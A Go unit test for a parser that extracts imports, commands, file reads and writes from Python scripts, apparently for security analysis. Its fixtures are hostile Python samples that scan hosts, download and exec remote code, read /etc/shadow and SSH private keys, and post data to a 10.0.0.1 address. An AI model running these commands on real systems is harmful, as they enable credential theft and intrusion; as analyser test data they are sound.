package parse

import (
	"slices"
	"testing"
)

const pyRecon = `#!/usr/bin/env python3
"""Recon step.

os.system("rm -rf /")
"""
import os, base64
import subprocess as sp
from pathlib import Path
from urllib.request import urlopen
from subprocess import (
    check_output as co,
    Popen,
)

TARGET = "10.20.1.5"
OUT: str = 'recon.txt'
CMD = f"nmap -sV {TARGET} | tee {OUT}"

# os.system("shred evidence")
sp.run(CMD, shell=True)
sp.run(
    ["sudo", "masscan", TARGET,
     "-oG", "mass.gnmap"],  # trailing comment
    check=True,
)
os.system("curl -s http://10.20.1.9/a.sh > /tmp/a.sh; cat /etc/passwd | base64")
co(["bash", "-c", "whoami && id"])
Popen(shlex.split("ssh root@10.20.1.5 uname"))
print("open('not-a-file')")

with open(OUT) as f:
    data = f.read()
with open("loot.b64", "wb") as f:
    f.write(base64.b64encode(data.encode()))
open("log.txt", mode="a").write("x")
keys = Path("/root/.ssh/id_rsa").read_text()
note = Path("note.txt")
note.write_text(keys)
page = urlopen("http://10.20.1.9/stage2").read()
exec(page)
key = bytes(a ^ b for a, b in zip(data, keys))
`

const pySocket = `import socket
import requests as rq
s = socket.socket()
s.connect(("10.0.0.1", 4444))
rq.post("http://10.0.0.1/up", data=open("/etc/shadow").read())
`

func TestExtractPython(t *testing.T) {
	recon := ExtractPython(pyRecon)
	sock := ExtractPython(pySocket)
	lists := []struct {
		name string
		got  []string
		want []string
	}{
		{"imports", recon.Imports, []string{"os", "base64", "subprocess", "pathlib", "urllib.request"}},
		{"tools", toolNames(recon), []string{
			"subprocess.run", "nmap", "tee", "subprocess.run", "masscan", "os.system", "curl", "cat",
			"base64", "subprocess.check_output", "bash", "whoami", "id", "subprocess.popen", "ssh", "uname",
			"urllib.request.urlopen", "exec",
		}},
		{"writes", recon.Writes, []string{"recon.txt", "mass.gnmap", "/tmp/a.sh", "loot.b64", "log.txt", "note.txt"}},
		{"reads", recon.Reads, []string{"recon.txt", "/root/.ssh/id_rsa"}},
		{"transforms", methodNames(recon), []string{"Base64", "Base64Encode", "XOR"}},
		{"socket imports", sock.Imports, []string{"socket", "requests"}},
		{"socket tools", toolNames(sock), []string{"socket.connect", "requests.post"}},
		{"socket reads", sock.Reads, []string{"/etc/shadow"}},
	}
	for _, c := range lists {
		if !slices.Equal(c.got, c.want) {
			t.Errorf("%s = %q, want %q", c.name, c.got, c.want)
		}
	}
	vars := varMap(recon)
	for name, want := range map[string]string{
		"TARGET": "10.20.1.5",
		"OUT":    "recon.txt",
		"CMD":    "nmap -sV 10.20.1.5 | tee recon.txt",
	} {
		if vars[name] != want {
			t.Errorf("%s = %q, want %q", name, vars[name], want)
		}
	}
	for _, c := range recon.Commands {
		if c.Tool == "masscan" && c.Line != 21 {
			t.Errorf("masscan line = %d, want 21", c.Line)
		}
	}
}

func methodNames(s Script) []string {
	var names []string
	for _, x := range s.Transforms {
		names = append(names, x.Method)
	}
	return names
}

func TestExtractPythonHostile(t *testing.T) {
	cases := []string{
		"",
		"subprocess.run(",
		"x = '''never closed",
		"os.system('a' \\",
		"open(((([[[{{{",
		"f\"{\"\nimport\nfrom . import\n= 1\n",
		"p = Path(\np.read_text()",
		"sp.run([\"\\",
	}
	for _, text := range cases {
		if s := ExtractPython(text); len(s.Writes)+len(s.Reads) > 0 {
			t.Errorf("%q: writes %q reads %q, want none", text, s.Writes, s.Reads)
		}
	}
}
